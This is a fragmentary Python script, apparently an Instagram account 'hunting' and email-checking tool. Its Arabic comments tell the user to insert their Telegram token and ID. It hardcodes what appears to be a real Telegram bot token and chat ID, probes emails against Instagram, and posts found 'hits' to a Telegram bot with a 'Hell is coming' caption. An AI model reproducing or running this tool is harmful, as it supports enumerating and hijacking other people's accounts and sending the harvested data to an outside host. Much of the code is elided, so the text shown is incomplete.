...
tok = "8859975825:AAErrL1suzZDkF2yChRDq__QFkhFMzzPcIo"  # حط التوكن بتاعك هنا
iD = "8085768728"  # حط الأيدي بتاعك هنا
os.system('clear')
def cookie(email):
...
def hunting(email):	
    ...
    'ig_sig_key_version': '4',
		...
		try:
			...
			name = None
		date = date_sc(Id)			
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/yyyyyy3w/15&caption=*â€¢ Cehennem Geliyor...
...
def check_email(email):
	...
	sys.stdout.write(f"\r   {bo}[ {C}ToTo {bo}] {C}Hit : {F}{good_hot}  {C}Wrong : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo} Checked â€¢{check}\r")
	sys.stdout.flush()
